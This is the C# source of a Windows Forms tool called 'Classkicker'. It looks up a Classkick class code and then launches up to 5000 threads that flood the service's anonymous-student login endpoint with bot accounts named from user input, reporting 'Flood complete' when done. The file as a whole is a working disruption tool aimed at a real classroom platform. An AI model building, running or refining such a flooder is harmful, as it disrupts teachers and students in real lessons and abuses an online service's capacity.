using System;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.IO;
using System.Threading;

namespace Classkicker___GUI
{
    public partial class Form1 : Form
    {
        public static string threaddir = @"C:\Users\" + Environment.UserName + @"\Classkicker";
        public static string threadfile = @"C:\Users\" + Environment.UserName + @"\Classkicker\threads.txt";
        public static int botspumped = 1;
        public static string code;
        public static int botcount;
        public static string botcounterer;
        public static string botname;
        public static int threadcount = 5000;
        public static Thread[] threaderer = new Thread[threadcount];
        public void forer(int botcount, string botname, string code)
        {
            for (int i = 1; botspumped <= botcount; i++)
            {
                if (botspumped == botcount)
                {
                    File.AppendAllText("benchmark.txt", "\nTime Stopped: " + DateTime.Now);
                    MessageBox.Show("Flood complete");
                    Environment.Exit(0);
                }
                else
                {
                    string botnamefin = botname + botspumped;
                    flood(code, botnamefin);
                }
            }
        }
        public Form1()
        {
            if (Directory.Exists(threaddir) == false) { Directory.CreateDirectory(threaddir); }
            File.WriteAllText(threadfile, "5000");
            threadcount = Convert.ToInt32(File.ReadAllText(threadfile));
            InitializeComponent();
            label1.BackColor = System.Drawing.Color.Transparent;
            label2.BackColor = System.Drawing.Color.Transparent;
            label3.BackColor = System.Drawing.Color.Transparent;
            label4.BackColor = System.Drawing.Color.Transparent;
            label4.Text = "Current threads: " + threadcount;
            CodeError.BackColor = System.Drawing.Color.Transparent;
            label5.BackColor = System.Drawing.Color.Transparent;
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
            timer.Interval = (10);
            timer.Tick += new EventHandler(timer_Tick);
            timer.Start();
        }
        private void button1_Click(object sender, EventArgs e)
        {
            threadcount = Convert.ToInt32(File.ReadAllText(threadfile));
            botcount = Convert.ToInt32(textBox2.Text);
            botname = textBox3.Text;

            File.WriteAllText("benchmark.txt", "Time started: " + DateTime.Now);

            for (int i = 0; i < threadcount; i++)
            {
                threaderer[i] = new Thread(() =>
                {
                    forer(botcount, botname, code);
                });
                threaderer[i].Start();
            }
        }
        public static async Task flood(string code, string botname)
        {
            var url = "https://services.classkick.com/v1/users/login/anonymous-student";

            var httpRequest = (HttpWebRequest)WebRequest.Create(url);
            httpRequest.Method = "POST";

            httpRequest.ContentType = "application/json";

            var data = "{\"class_code\":\"" + code + "\",\"name\":\"" + botname + "\"}";

            using (var streamWriter = new StreamWriter(httpRequest.GetRequestStream()))
            {
                streamWriter.Write(data);
            }

            var httpResponse = (HttpWebResponse)httpRequest.GetResponse();

            using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
            {
                var result = streamReader.ReadToEnd();
            }
            botspumped++;
        }
        private void button2_Click_1(object sender, EventArgs e)
        {
            Options op = new Options();
            op.Show();
        }
        private void timer_Tick(object sender, EventArgs e)
        {
            label4.Text = "Current threads: " + threadcount;
            threadcount = Convert.ToInt32(File.ReadAllText(threadfile));
        }
        private void button3_Click(object sender, EventArgs e)
        {
                label5.Show();
                code = textbox1.Text;
                var url = "https://services.classkick.com/v1/class-codes/" + code + "/usernames";

                var httpRequest = (HttpWebRequest)WebRequest.Create(url);
                httpRequest.Method = "GET";

                httpRequest.ContentType = "application/json";
                try
                {
                    var httpResponse = (HttpWebResponse)httpRequest.GetResponse();
                    string result = "plcholder";

                    using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                    {
                        result = streamReader.ReadToEnd();
                    }

                    if (result.Contains("\"allow_new_members\":true,\""))
                    {
                        label2.Hide();
                        textbox1.Hide();
                        button3.Hide();
                        label3.Show();
                        textBox3.Show();
                        label1.Show();
                        textBox2.Show();
                        button1.Show();
                        label5.Hide();
                        CodeError.Hide();
                    }
                }
                catch (WebException ex)
                {
                    label5.Hide();
                    CodeError.Show();
                }
        }
    }
}
